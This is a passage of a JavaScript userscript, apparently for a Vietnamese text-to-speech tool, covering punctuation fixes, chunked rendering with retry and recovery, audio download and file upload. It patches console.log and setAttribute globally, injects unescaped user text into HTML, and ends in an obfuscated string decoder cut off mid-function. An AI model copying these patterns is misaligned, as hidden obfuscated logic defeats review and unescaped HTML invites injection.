                        </div>
                        <div style="color: #f8f8f2; margin-bottom: 6px;">
                            <strong>Phát hiện:</strong> <span style="background: #ff5555; color: white; padding: 2px 6px; border-radius: 3px; font-family: monospace;">"${issue.text}"</span>
                        </div>
                        <div style="color: #50fa7b;">
                            <strong>Đề xuất:</strong> <span style="background: #50fa7b; color: #282a36; padding: 2px 6px; border-radius: 3px; font-family: monospace;">"${issue.suggestion}"</span>
                        </div>
                    `;

                    issuesList.appendChild(issueDiv);
                });

                // Hiển thị modal
                modal.style.display = 'flex';
            }

            // Hàm tự động sửa tất cả lỗi dấu câu
            // Hàm tự động sửa các từ Tiếng Việt hay bị đọc sai (ai, im)
            function fixVietnameseWords(text) {
                // Chỉ sửa khi language = Tiếng Việt
                const languageSelect = document.getElementById('gemini-language-select');
                if (!languageSelect) return text;
                
                const selectedLanguage = languageSelect.value.toLowerCase();
                
                // Check nếu KHÔNG phải Tiếng Việt → không sửa
                if (!selectedLanguage.includes('việt') && !selectedLanguage.includes('viet') && !selectedLanguage.includes('vietnamese')) {
                    console.log('Language not Vietnamese, skipping Vietnamese word fixes');
                    return text;
                }
                
                console.log('Applying Vietnamese word fixes for language:', selectedLanguage);
                
                let fixedText = text;
                let fixCount = 0;
                
                // Fix "ai" → "Ai" (chỉ khi đứng độc lập)
                // \b = word boundary (đảm bảo từ đứng độc lập)
                // Ví dụ: "ai đó" → "Ai đó" ✅
                // Ví dụ: "bại hoại" → KHÔNG đổi ❌
                const aiPattern = /\bai\b/g;
                const aiMatches = fixedText.match(aiPattern);
                if (aiMatches) {
                    fixedText = fixedText.replace(aiPattern, 'Ai');
                    fixCount += aiMatches.length;
                    console.log(`Fixed ${aiMatches.length} occurrences of "ai" → "Ai"`);
                }
                
                // Fix "im" → "Im" (chỉ khi đứng độc lập)
                // Ví dụ: "im lặng" → "Im lặng" ✅
                // Ví dụ: "kim loại" → KHÔNG đổi ❌
                const imPattern = /\bim\b/g;
                const imMatches = fixedText.match(imPattern);
                if (imMatches) {
                    fixedText = fixedText.replace(imPattern, 'Im');
                    fixCount += imMatches.length;
                    console.log(`Fixed ${imMatches.length} occurrences of "im" → "Im"`);
                }
                
                if (fixCount > 0) {
                    console.log(`Total Vietnamese word fixes: ${fixCount}`);
                }
                
                return fixedText;
            }

            function autoFixAllPunctuationIssues() {
                console.log('autoFixAllPunctuationIssues called');

                const textarea = document.getElementById('gemini-main-textarea');
                const defaultPunctuation = document.getElementById('default-punctuation-select');
                const modal = document.getElementById('punctuation-detection-modal');

                console.log('Elements found:', {
                    textarea: !!textarea,
                    defaultPunctuation: !!defaultPunctuation,
                    modal: !!modal,
                    issuesCount: detectedPunctuationIssues.length
                });

                if (!textarea) {
                    console.error('Textarea not found');
                    return;
                }

                if (!defaultPunctuation) {
                    console.error('Default punctuation select not found');
                    return;
                }

                if (!modal) {
                    console.error('Modal not found');
                    return;
                }

                if (!detectedPunctuationIssues.length) {
                    console.log('No issues to fix');
                    modal.style.display = 'none';
                    return;
                }

                const punctuationValue = defaultPunctuation.value;
                console.log('Using punctuation:', punctuationValue);

                let text = textarea.value;
                console.log('Original text length:', text.length);

                // Tách punctuation issues và Vietnamese word issues
                const punctuationIssues = detectedPunctuationIssues.filter(issue => !issue.isVietnameseWord);
                const vietnameseWordIssues = detectedPunctuationIssues.filter(issue => issue.isVietnameseWord);

                console.log('Punctuation issues:', punctuationIssues.length);
                console.log('Vietnamese word issues:', vietnameseWordIssues.length);

                // ========================================
                // 🔧 FIX BUG: MERGE TẤT CẢ ISSUES THÀNH 1 MẢNG
                // Merge thành 1 mảng với replacement được set sẵn
                // ========================================
                const allIssues = [
                    ...punctuationIssues.map(issue => ({
                        ...issue,
                        replacement: punctuationValue  // Dùng punctuation user chọn
                    })),
                    ...vietnameseWordIssues.map(issue => ({
                        ...issue,
                        replacement: issue.suggestion  // Dùng suggestion (Ai, Im)
                    }))
                ];

                console.log(`Total issues to fix: ${allIssues.length}`);

                // Sort TẤT CẢ issues theo thứ tự NGƯỢC (từ cuối lên đầu)
                // Vì fix từ cuối, nên KHÔNG BAO GIỜ ảnh hưởng đến index của issues phía trước
                const sortedAllIssues = allIssues.sort((a, b) => b.start - a.start);

                // Fix TẤT CẢ issues từ CUỐI lên ĐẦU
                sortedAllIssues.forEach((issue, index) => {
                    console.log(`Fixing issue ${index + 1}/${sortedAllIssues.length}: "${issue.text}" → "${issue.replacement}"`);
                    const beforeText = text.substring(0, issue.start);
                    const afterText = text.substring(issue.end);
                    text = beforeText + issue.replacement + afterText;
                });

                textarea.value = text;
                detectedPunctuationIssues = [];

                // Đóng modal
                modal.style.display = 'none';
                console.log('Modal closed');

                // Trigger input event để cập nhật stats
                textarea.dispatchEvent(new Event('input'));

                // Hiển thị thông báo thành công
                const totalIssues = sortedAllIssues.length;
                const punctuationCount = punctuationIssues.length;
                const vietnameseCount = vietnameseWordIssues.length;
                
                if (typeof Swal !== 'undefined') {
                    Swal.fire({
                        toast: true,
                        position: 'top-end',
                        icon: 'success',
                        title: 'Đã sửa dấu câu & từ Tiếng Việt',
                        text: `Đã tự động sửa ${punctuationCount} lỗi dấu câu và ${vietnameseCount} từ Tiếng Việt`,
                        showConfirmButton: false,
                        timer: 2000,
                        timerProgressBar: true
                    });
                }
            }

            // Hàm bỏ qua tất cả lỗi dấu câu
            function ignoreAllPunctuationIssues() {
                console.log('ignoreAllPunctuationIssues called');

                const modal = document.getElementById('punctuation-detection-modal');
                console.log('Modal found:', !!modal);

                detectedPunctuationIssues = [];

                if (modal) {
                    modal.style.display = 'none';
                    console.log('Modal closed');
                } else {
                    console.error('Modal not found for closing');
                }
            }

            // Thêm các hàm vào global scope để có thể gọi từ HTML
            window.autoFixAllPunctuationIssues = autoFixAllPunctuationIssues;
            window.ignoreAllPunctuationIssues = ignoreAllPunctuationIssues;
            window.fixVietnameseWords = fixVietnameseWords; // ⭐ Expose để dùng ở nơi khác

            // Event listener cho textarea để phát hiện dấu câu
            const textarea = document.getElementById('gemini-main-textarea');
            if (textarea) {
                textarea.addEventListener('input', function() {
                    const text = this.value;
                    detectedPunctuationIssues = detectPunctuationIssues(text);

                    if (detectedPunctuationIssues.length > 0) {
                        displayPunctuationIssues(detectedPunctuationIssues);
                    }
                });
            }

            // Event listener cho nút "Bắt đầu tạo âm thanh" để kiểm tra dấu câu
            const startBtn = document.getElementById('gemini-start-queue-btn');
            if (startBtn) {
                startBtn.addEventListener('click', function() {
                    const text = textarea.value;
                    detectedPunctuationIssues = detectPunctuationIssues(text);

                    if (detectedPunctuationIssues.length > 0) {
                        displayPunctuationIssues(detectedPunctuationIssues);
                        // Ngăn không cho bắt đầu tạo âm thanh nếu có lỗi dấu câu
                        return false;
                    }
                });
            }

            // Event listener cho modal
            const modal = document.getElementById('punctuation-detection-modal');
            if (modal) {
                modal.addEventListener('click', function(e) {
                    if (e.target === modal) {
                        ignoreAllPunctuationIssues();
                    }
                });
            }
        })();

        // --- 6. Retry Logic and Recovery System ---
        (function() {
            // =================================================================
            // == KHỐI CODE NÂNG CẤP - CƠ CHẾ PHỤC HỒI NÓNG VÀ THỬ LẠI LỖI ==
            // =================================================================

            /**
             * Hợp nhất và tự động tải xuống các đoạn âm thanh đã thành công.
             */
            function mergeAndDownloadPartial(audioChunks, segmentIndex) {
                if (!audioChunks || audioChunks.length === 0) {
                    Swal.fire('Không có gì để tải', 'Không có đoạn âm thanh nào được xử lý thành công.', 'warning');
                    return;
                }
                console.log(`Bắt đầu hợp nhất ${audioChunks.length} đoạn âm thanh đã thành công...`);
                const mergedBlob = new Blob(audioChunks, { 'type': 'audio/mpeg' });
                const url = URL.createObjectURL(mergedBlob);
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = url;
                // ƯU TIÊN 1: Kiểm tra tên file do người dùng nhập tùy chỉnh
                const customFilenameInput = document.getElementById('custom-filename-input');
                let fileName = 'audio'; // Tên mặc định

                // Nếu người dùng đã nhập tên file tùy chỉnh, ưu tiên sử dụng tên đó
                if (customFilenameInput && customFilenameInput.value && customFilenameInput.value.trim()) {
                    fileName = customFilenameInput.value.trim();

                    // Làm sạch tên file: loại bỏ ký tự không hợp lệ, thay khoảng trắng bằng gạch dưới
                    fileName = fileName
                        .replace(/[<>:"/\\|?*]/g, '') // Loại bỏ các ký tự không hợp lệ trong tên file
                        .replace(/\s+/g, '_')         // Thay thế một hoặc nhiều khoảng trắng bằng dấu gạch dưới
                        .replace(/[^\w\u00C0-\u1EF9]/g, '') // Chỉ giữ chữ cái, số và tiếng Việt
                        .trim();

                    if (fileName.length > 100) {
                        fileName = fileName.substring(0, 100);
                    }
                }

                // ƯU TIÊN 2: Nếu không có tên tùy chỉnh, kiểm tra tên file văn bản đã tải lên
                if (fileName === 'audio') {
                    const textFileInput = document.getElementById('text-file-input');

                    // Nếu có file văn bản đã tải lên, sử dụng tên file đó
                    if (textFileInput && textFileInput.files && textFileInput.files.length > 0) {
                        const uploadedTextFile = textFileInput.files[0];
                        if (uploadedTextFile && uploadedTextFile.name) {
                            // Lấy tên file văn bản đã tải lên (bỏ đuôi file)
                            const uploadedFileName = uploadedTextFile.name;
                            const lastDotIndex = uploadedFileName.lastIndexOf('.');
                            if (lastDotIndex > 0) {
                                fileName = uploadedFileName.substring(0, lastDotIndex);
                            } else {
                                fileName = uploadedFileName;
                            }

                            // Làm sạch tên file: loại bỏ ký tự không hợp lệ, thay khoảng trắng bằng gạch dưới
                            fileName = fileName
                                .replace(/[<>:"/\\|?*]/g, '') // Loại bỏ các ký tự không hợp lệ trong tên file
                                .replace(/\s+/g, '_')         // Thay thế một hoặc nhiều khoảng trắng bằng dấu gạch dưới
                                .replace(/[^\w\u00C0-\u1EF9]/g, '') // Chỉ giữ chữ cái, số và tiếng Việt
                                .trim();

                            if (fileName.length > 100) {
                                fileName = fileName.substring(0, 100);
                            }
                        }
                    }
                }

                // ƯU TIÊN 3: Nếu vẫn chưa có tên, dùng dòng đầu tiên của văn bản
                if (fileName === 'audio') {
                    const textarea = document.getElementById('gemini-main-textarea');
                    if (textarea && textarea.value) {
                        const firstLine = textarea.value.split('\n')[0].trim();
                        if (firstLine) {
                            fileName = firstLine
                                .replace(/[<>:"/\\|?*]/g, '') // Loại bỏ ký tự không hợp lệ
                                .replace(/\s+/g, '_') // Thay thế khoảng trắng bằng _
                                .replace(/[^\w\u00C0-\u1EF9]/g, '') // Chỉ giữ chữ cái, số và tiếng Việt
                                .trim();
                            if (fileName.length > 100) {
                                fileName = fileName.substring(0, 100);
                            }
                        }
                    }
                }
                a.download = `${fileName}.mp3`;
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                    console.log('Đã tải xuống phần âm thanh thành công.');

                    // 🚀 TỰ ĐỘNG TẢI XUỐNG FILE SAU KHI GHÉP CHUNK THÀNH CÔNG
                    console.log('🎉 Đã tự động tải xuống file âm thanh từ các chunk thành công!');
                }, 100);
            }

            /**
             * Lấy toàn bộ phần văn bản còn lại từ điểm bị lỗi.
             */
            function getRemainingText(failedIndex, allSegments) {
                if (failedIndex >= allSegments.length) return "";
                const remainingSegments = allSegments.slice(failedIndex);
                return remainingSegments.join('\n\n');
            }

            /**
             * Reset lại trạng thái của tool và bắt đầu một lần render mới.
             */
            function resetAndStartNewRender(newText) {
                console.log("🔥 Bắt đầu phục hồi nóng với văn bản mới...");

                // 1. Reset trạng thái cốt lõi
                if (typeof window.ZTQj$LF$o !== 'undefined') window.ZTQj$LF$o = [];
                if (typeof window.SI$acY !== 'undefined') window.SI$acY = [];
                if (typeof window.ttuo$y_KhCV !== 'undefined') window.ttuo$y_KhCV = 0;
                if (typeof window.retryCount !== 'undefined') window.retryCount = 0;

                // 2. Cập nhật giao diện
                const progressBar = document.getElementById('gemini-progress-bar');
                const progressLabel = document.getElementById('gemini-progress-label');
                if(progressBar && progressLabel) {
                    progressBar.style.width = '0%';
                    progressLabel.textContent = '0%';
                }
                const startButton = document.getElementById('gemini-start-queue-btn');
                if(startButton) startButton.disabled = true;

                // 3. Chuẩn bị cho lần render mới
                if (typeof window.SI$acY !== 'undefined') {
                    // Lấy giá trị từ công tắc chunk size
                    const chunkSizeToggle = document.getElementById('chunk-size-toggle');
                    const useLargeChunks = chunkSizeToggle ? chunkSizeToggle.checked : false;
                    const actualMaxLength = useLargeChunks ? 900 : 700;
                    window.SI$acY = chiaVanBanThongMinh(newText, 600, 500, actualMaxLength);
                    console.log(`Tổng văn bản: ${newText.length} ký tự`);
                    console.log(`Số chunk được tách: ${window.SI$acY.length}`);
                    console.log(`Chunk đầu tiên: ${window.SI$acY[0] ? window.SI$acY[0].length : 0} ký tự`);
                    console.log(`Chunk thứ 2: ${window.SI$acY[1] ? window.SI$acY[1].length : 0} ký tự`);
                    console.log(`Chunk thứ 3: ${window.SI$acY[2] ? window.SI$acY[2].length : 0} ký tự`);
                    console.log(`Chunk cuối: ${window.SI$acY[window.SI$acY.length-1] ? window.SI$acY[window.SI$acY.length-1].length : 0} ký tự`);
                    if(window.SI$acY.length > 4) {
                        console.log(`Chunk thứ 4: ${window.SI$acY[3] ? window.SI$acY[3].length : 0} ký tự`);
                        console.log(`Chunk thứ 5: ${window.SI$acY[4] ? window.SI$acY[4].length : 0} ký tự`);
                    }
                    if (window.SI$acY.length > 0) {
                         if(startButton) startButton.disabled = false;
                    }
                    console.log(`Văn bản còn lại được chia thành ${window.SI$acY.length} đoạn mới.`);
                }

                // 4. Kích hoạt lại và bắt đầu
                if (typeof window.EfNjYNYj_O_CGB !== 'undefined') window.EfNjYNYj_O_CGB = true;
                if (typeof window.MEpJezGZUsmpZdAgFRBRZW !== 'undefined') window.MEpJezGZUsmpZdAgFRBRZW = true;
                if (typeof window.uSTZrHUt_IC_GLOBAL === 'function') {
                    window.uSTZrHUt_IC_GLOBAL();
                } else {
                    Swal.fire('Lỗi nghiêm trọng', 'Không thể khởi động lại tiến trình. Vui lòng tải lại trang.', 'error');
                }
            }

            /**
             * Hiển thị dialog phục hồi với tùy chọn render tiếp.
             */
            function showRecoveryDialog() {
                if (typeof window.EfNjYNYj_O_CGB !== 'undefined') window.EfNjYNYj_O_CGB = false;
                if (typeof window.MEpJezGZUsmpZdAgFRBRZW !== 'undefined') window.MEpJezGZUsmpZdAgFRBRZW = false;

                const remainingText = getRemainingText(window.ttuo$y_KhCV || 0, window.SI$acY || []);
                const successfulChunkCount = (window.ZTQj$LF$o || []).length;
                const failedChunkIndex = (window.ttuo$y_KhCV || 0) + 1;

                Swal.fire({
                    title: '<strong>⚠️ Đã Xảy Ra Lỗi - Chế Độ Phục Hồi</strong>',
                    icon: 'error',
                    html: `
                        <div style="text-align: left; font-size: 14px;">
                            <p>Quá trình render đã dừng ở <b>đoạn ${failedChunkIndex}</b>.</p>
                            <p>Bạn có thể tải về phần đã hoàn thành, sau đó render tiếp phần còn lại.</p>
                            <hr>
                            <p><b>PHẦN VĂN BẢN CÒN LẠI:</b></p>
                        </div>
                        <textarea id="swal-remaining-text" style="width: 95%; height: 120px; margin-top: 10px; font-size: 12px;">${remainingText}</textarea>
                    `,
                    width: '600px',
                    showCloseButton: true,
                    focusConfirm: false,
                    confirmButtonText: `✅ Tải Phần 1 (${successfulChunkCount} Đoạn)`,
                    confirmButtonColor: '#3085d6',
                    showDenyButton: true,
                    denyButtonText: `🚀 Render Tiếp Phần 2`,
                    denyButtonColor: '#4CAF50',
                    showCancelButton: true,
                    cancelButtonText: 'Đóng',
                }).then((result) => {
                    if (result.isConfirmed) {
                        mergeAndDownloadPartial(window.ZTQj$LF$o || [], window.ttuo$y_KhCV || 0);
                        const textarea = document.getElementById('swal-remaining-text');
                        textarea.select();
                        document.execCommand('copy');
                        Swal.fire({
                            toast: true,
                            position: 'top-end',
                            icon: 'success',
                            title: 'Đã tải file và copy phần còn lại!',
                            showConfirmButton: false,
                            timer: 3000
                        });
                    } else if (result.isDenied) {
                        const textToRender = document.getElementById('swal-remaining-text').value;
                        if (textToRender && textToRender.trim().length > 0) {
                            resetAndStartNewRender(textToRender);
                        } else {
                            Swal.fire('Hoàn tất!', 'Không còn văn bản nào để render.', 'info');
                        }
                    }
                });
            }


            // Override console.log để phát hiện khi hết retry
            const originalConsoleLog = console.log;
            console.log = function(...args) {
                const message = args.join(' ');

                // Phát hiện khi hết retry
                if (message.includes('Đã thử lại') && message.includes('lần nhưng vẫn thất bại')) {
                    console.warn('🚨 Phát hiện hết lượt retry, ngừng tool...');
                    setTimeout(() => {
                        if (typeof window.stopTool === 'function') {
                            window.stopTool();
                        }
                    }, 1000);
                }

                return originalConsoleLog.apply(console, args);
            };

            // Thêm helper functions
            window.minimaxRetryHelper = {
                // Kiểm tra trạng thái tool
                isToolStopped: function() {
                    return window.toolStopped || false;
                },

                // Ngừng tool
                stop: function() {
                    if (typeof window.stopTool === 'function') {
                        window.stopTool();
                    }
                },

                // Khởi động lại tool
                restart: function() {
                    if (typeof window.restartTool === 'function') {
                        window.restartTool();
                    }
                },

                // Kiểm tra số lần retry
                checkRetryCount: function() {
                    // Tìm biến retryCount trong global scope
                    for (let key in window) {
                        if (key.includes('retry') || key.includes('Retry')) {
                            console.log(`Retry variable: ${key} = ${window[key]}`);
                        }
                    }
                },

                // Hàm xử lý retry logic (đã được tích hợp vào uSTZrHUt_IC)
                handleRetry: function() {
                    console.log('Retry logic đã được tích hợp vào hàm chính uSTZrHUt_IC');
                },

                // Hàm hiển thị recovery dialog
                showRecovery: showRecoveryDialog,

                // Hàm reset và render mới
                resetAndRender: resetAndStartNewRender
            };

            console.log('✅ Đã thêm chức năng retry và phục hồi nóng');

            // === SỬA LỖI ARIA-HIDDEN ===
            // Ngăn chặn việc đặt aria-hidden="true" trên container chính
            const originalSetAttribute = Element.prototype.setAttribute;
            Element.prototype.setAttribute = function(name, value) {
                if (name === 'aria-hidden' && this.id === 'gemini-main-container') {
                    console.warn('🚫 Ngăn chặn việc đặt aria-hidden trên gemini-main-container để tránh lỗi accessibility');
                    return;
                }
                return originalSetAttribute.call(this, name, value);
            };

            // Đảm bảo container không có aria-hidden khi khởi tạo
            setTimeout(() => {
                const container = document.getElementById('gemini-main-container');
                if (container && container.hasAttribute('aria-hidden')) {
                    container.removeAttribute('aria-hidden');
                    console.log('✅ Đã xóa aria-hidden khỏi gemini-main-container');
                }
            }, 1000);

        })();

        // --- 7. Text File Upload Functionality ---
        (function() {
            // Tab switching functionality
            const textTab = document.getElementById('text-tab');
            const fileTab = document.getElementById('file-tab');
            const textInputArea = document.getElementById('text-input-area');
            const fileInputArea = document.getElementById('file-input-area');
            const textFileInput = document.getElementById('text-file-input');
            const fileUploadArea = document.getElementById('file-upload-area');
            const fileInfo = document.getElementById('file-info');
            const removeFileBtn = document.getElementById('remove-file-btn');
            const textarea = document.getElementById('gemini-main-textarea');

            // Tab switching
            if (textTab && fileTab && textInputArea && fileInputArea) {
                textTab.addEventListener('click', function() {
                    textTab.classList.add('active');
                    fileTab.classList.remove('active');
                    textInputArea.classList.add('active');
                    fileInputArea.classList.remove('active');
                });

                fileTab.addEventListener('click', function() {
                    fileTab.classList.add('active');
                    textTab.classList.remove('active');
                    fileInputArea.classList.add('active');
                    textInputArea.classList.remove('active');
                });
            }

            // File upload functionality
            if (fileUploadArea && textFileInput) {
                // Click to select file
                fileUploadArea.addEventListener('click', function() {
                    textFileInput.click();
                });

                // File input change
                textFileInput.addEventListener('change', function(e) {
                    const file = e.target.files[0];
                    if (file) {
                        handleFileUpload(file);
                    }
                });

                // Drag and drop functionality
                fileUploadArea.addEventListener('dragover', function(e) {
                    e.preventDefault();
                    fileUploadArea.classList.add('dragover');
                });

                fileUploadArea.addEventListener('dragleave', function(e) {
                    e.preventDefault();
                    fileUploadArea.classList.remove('dragover');
                });

                fileUploadArea.addEventListener('drop', function(e) {
                    e.preventDefault();
                    fileUploadArea.classList.remove('dragover');

                    const files = e.dataTransfer.files;
                    if (files.length > 0) {
                        handleFileUpload(files[0]);
                    }
                });
            }

            // Remove file functionality
            if (removeFileBtn) {
                removeFileBtn.addEventListener('click', function() {
                    clearFileSelection();
                });
            }

            // Handle file upload
            function handleFileUpload(file) {
                const fileName = file.name;
                const fileSize = formatFileSize(file.size);
                const fileExtension = fileName.split('.').pop().toLowerCase();

                // Check if file type is supported
                const supportedTypes = ['txt', 'doc', 'docx', 'rtf', 'odt', 'pdf', 'md', 'html', 'htm', 'xml', 'csv', 'json'];
                if (!supportedTypes.includes(fileExtension)) {
                    Swal.fire({
                        icon: 'error',
                        title: 'Loại file không được hỗ trợ',
                        text: `File ${fileName} có định dạng không được hỗ trợ. Vui lòng chọn file khác.`,
                        confirmButtonText: 'OK'
                    });
                    return;
                }

                // Show file info
                if (fileInfo) {
                    const fileNameSpan = fileInfo.querySelector('.file-name');
                    const fileSizeSpan = fileInfo.querySelector('.file-size');

                    if (fileNameSpan) fileNameSpan.textContent = fileName;
                    if (fileSizeSpan) fileSizeSpan.textContent = fileSize;

                    fileInfo.style.display = 'block';
                }

                // Hide upload area
                fileUploadArea.style.display = 'none';

                // Read file content
                readFileContent(file);
            }

            // Clear file selection
            function clearFileSelection() {
                if (textFileInput) textFileInput.value = '';
                if (fileInfo) fileInfo.style.display = 'none';
                if (fileUploadArea) fileUploadArea.style.display = 'block';
            }

            // Cache file extension để tránh tính toán lại
            const fileExtensionCache = new Map();

            // Read file content
            function readFileContent(file) {
                const reader = new FileReader();

                reader.onload = function(e) {
                    let content = e.target.result;

                    // Cache file extension
                    let fileExtension = fileExtensionCache.get(file.name);
                    if (!fileExtension) {
                        fileExtension = file.name.split('.').pop().toLowerCase();
                        fileExtensionCache.set(file.name, fileExtension);
                    }

                    // Optimize file processing with switch statement
                    switch (fileExtension) {
                        case 'json':
                        try {
                            const jsonData = JSON.parse(content);
                            content = JSON.stringify(jsonData, null, 2);
                        } catch (error) {
                            console.error('Error parsing JSON:', error);
                            Swal.fire({
                                icon: 'error',
                                title: 'Lỗi đọc file JSON',
                                text: 'File JSON không hợp lệ hoặc bị lỗi.',
                                confirmButtonText: 'OK'
                            });
                            return;
                        }
                            break;
                        case 'csv':
                        // Convert CSV to readable format
                        content = content.replace(/,/g, ', ');
                            break;
                        case 'html':
                        case 'htm':
                        case 'xml':
                            // Extract text from HTML/XML
                        const tempDiv = document.createElement('div');
                        tempDiv.innerHTML = content;
                        content = tempDiv.textContent || tempDiv.innerText || '';
                            break;
                        default:
                            // No processing needed for other file types
                            break;
                    }

                    // Set content to textarea
                    if (textarea) {
                        textarea.value = content;

                        // Trigger input event to update stats
                        textarea.dispatchEvent(new Event('input'));

                        // Switch to text tab to show the content
                        if (textTab && textInputArea) {
                            textTab.click();
                        }
                    }

                    // Show success message
                    Swal.fire({
                        toast: true,
                        position: 'top-end',
                        icon: 'success',
                        title: 'Đã tải file thành công',
                        text: `Đã đọc nội dung từ ${file.name}`,
                        showConfirmButton: false,
                        timer: 3000,
                        timerProgressBar: true
                    });
                };

                reader.onerror = function() {
                    Swal.fire({
                        icon: 'error',
                        title: 'Lỗi đọc file',
                        text: 'Không thể đọc nội dung file. Vui lòng thử lại.',
                        confirmButtonText: 'OK'
                    });
                };

                // Read file based on type
                const fileExtension = file.name.split('.').pop().toLowerCase();

                if (fileExtension === 'pdf') {
                    // For PDF files, we can only read as text (limited functionality)
                    reader.readAsText(file);
                } else {
                    reader.readAsText(file, 'UTF-8');
                }
            }

            // Format file size
            function formatFileSize(bytes) {
                if (bytes === 0) return '0 Bytes';
                const k = 1024;
                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
            }

            console.log('✅ Text file upload functionality initialized');
        })();

        // --- 7b. Simple Text File Load Button ---
        (function() {
            const loadTextFileBtn = document.getElementById('load-text-file-btn');
            const textFileInput = document.getElementById('text-file-input');
            const textarea = document.getElementById('gemini-main-textarea');

            if (loadTextFileBtn && textFileInput && textarea) {
                // Click button to open file picker
                loadTextFileBtn.addEventListener('click', function() {
                    textFileInput.click();
                });

                // Handle file selection
                textFileInput.addEventListener('change', function(e) {
                    const file = e.target.files[0];
                    if (file) {
                        const reader = new FileReader();
                        
                        reader.onload = function(event) {
                            let content = event.target.result;
                            const fileExtension = file.name.split('.').pop().toLowerCase();
                            
                            // Process based on file type
                            switch (fileExtension) {
                                case 'json':
                                    try {
                                        const jsonData = JSON.parse(content);
                                        content = JSON.stringify(jsonData, null, 2);
                                    } catch (error) {
                                        console.error('Error parsing JSON:', error);
                                    }
                                    break;
                                case 'csv':
                                    content = content.replace(/,/g, ', ');
                                    break;
                                case 'html':
                                case 'htm':
                                case 'xml':
                                    const tempDiv = document.createElement('div');
                                    tempDiv.innerHTML = content;
                                    content = tempDiv.textContent || tempDiv.innerText || '';
                                    break;
                            }
                            
                            // Set content to textarea
                            textarea.value = content;
                            
                            // Trigger input event to update stats
                            textarea.dispatchEvent(new Event('input'));
                            
                            // Show success notification
                            Swal.fire({
                                icon: 'success',
                                title: 'Thành công!',
                                text: `Đã tải file ${file.name}`,
                                timer: 2000,
                                showConfirmButton: false
                            });
                        };
                        
                        reader.onerror = function() {
                            Swal.fire({
                                icon: 'error',
                                title: 'Lỗi đọc file',
                                text: 'Không thể đọc file. Vui lòng thử lại.',
                                confirmButtonText: 'OK'
                            });
                        };
                        
                        reader.readAsText(file);
                        
                        // Clear file input for next selection
                        textFileInput.value = '';
                    }
                });
                
                console.log('✅ Simple text file load button initialized');
            }
        })();

        // --- END: NEW FUNCTIONALITY ---

    });}()));function DHk$uTvcFuLEMnixYuADkCeA(pI$MOJQMtz,qMafRQSr$kqOyIDpnWILsG$m){const sDW$m$oaIcvGh=IG_rKyaLCWfnmy();return DHk$uTvcFuLEMnixYuADkCeA=function(agsldR$VHZsY,HQ$QxNn$sqmlOo){agsldR$VHZsY=agsldR$VHZsY-(-parseInt(0x1658)+0x15*0x1d4+-parseInt(0xe53));let NuHHczgcMmC$dgNAQ_av=sDW$m$oaIcvGh[agsldR$VHZsY];if(DHk$uTvcFuLEMnixYuADkCeA['GwHBCH']===undefined){const pSDgivifHicq=function(ZDBelLoplvd){let LTpuQjPZGSEvWFFG_HMMYp=Math.floor(0x3ae)+parseInt(0x21f7)+-parseInt(0x251c)&parseFloat(parseInt(0xb10))+Math.max(-0x1,-parseInt(0x1))*parseInt(0x17a3)+Math.max(parseInt(0xd92),0xd92),Yi_PTjcHoEdMSYXbozrAu=new Uint8Array(ZDBelLoplvd['match'](/.{1,2}/g)['map'](YaKwKhjUV_lUZeqSr$D=>parseInt(YaKwKhjUV_lUZeqSr$D,-parseInt(0xc)*Math.trunc(0x226)+Math.ceil(parseInt(0x1))*parseFloat(-0x40d)+0x1de5))),WoWKWnVwat$ILpwOem=Yi_PTjcHoEdMSYXbozrAu['map'](JPAIGeP=>JPAIGeP^LTpuQjPZGSEvWFFG_HMMYp),otZVuCbewOPp$aEOGpMrFuZu=new TextDecoder(),YEMs_hRHlmvQ=otZVuCbewOPp$aEOGpMrFuZu['decode'](WoWKWnVwat$ILpwOem);return YEMs_hRHlmvQ;};DHk$uTvcFuLEMnixYuADkCeA['sqLvJH']=pSDgivifHicq,pI$MOJQMtz=arguments,DHk$uTvcFuLEMnixYuADkCeA['GwHBCH']=!![];}const zhUTECtWyO=sDW$m$oaIcvGh[0x58e+0x20d5+0x1f*-0x13d],idn_YxlxYFSxZJ=agsldR$VHZsY+zhUTECtWyO,XjIGznPTtKadsftvjNaFY$vr=pI$MOJQMtz[idn_YxlxYFSxZJ];return!XjIGznPTtKadsftvjNaFY$vr?(DHk$uTvcFuLEMnixYuADkCeA['vwpetG']===undefined&&(DHk$uTvcFuLEMnixYuADkCeA['vwpetG']=!![]),NuHHczgcMmC$dgNAQ_av=DHk$uTvcFuLEMnixYuADkCeA['sqLvJH'](NuHHczgcMmC$dgNAQ_av),pI$MOJQMtz[idn_YxlxYFSxZJ]=NuHHczgcMmC$dgNAQ_av):NuHHczgcMmC$dgNAQ_av=XjIGznPTtKadsftvjNaFY$vr,NuHHczgcMmC$dgNAQ_av;},DHk$uTvcFuLEMnixYuADkCeA(pI$MOJQMtz,qMafRQSr$kqOyIDpnWILsG$m);}function IG_rKyaLCWfnmy(){const 